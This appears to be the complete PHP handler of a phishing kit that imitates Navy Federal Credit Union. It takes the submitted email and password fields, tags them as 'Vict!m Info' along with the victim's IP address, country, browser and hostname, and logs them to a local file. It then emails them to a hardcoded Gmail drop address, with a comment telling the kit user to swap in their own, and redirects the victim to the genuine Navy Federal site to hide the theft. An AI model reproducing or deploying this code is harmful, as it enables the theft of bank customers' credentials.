<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Info-----------------------\n";
$message .= " ".$_POST['em']."\n";
$message .= " ".$_POST['empa']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$file = fopen("./ip.txt","a");
fwrite($file,$message);
$message .= "---------------Created BY IDCASH-------------\n";
//change ur email here
$send = "delexian4@gmail.com";
$subject = "NAVY -$ip";
$headers = "From: NAVY <a@a.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: https://www.navyfederal.org/membership/welcome-to-navy-federal.html");
  

?>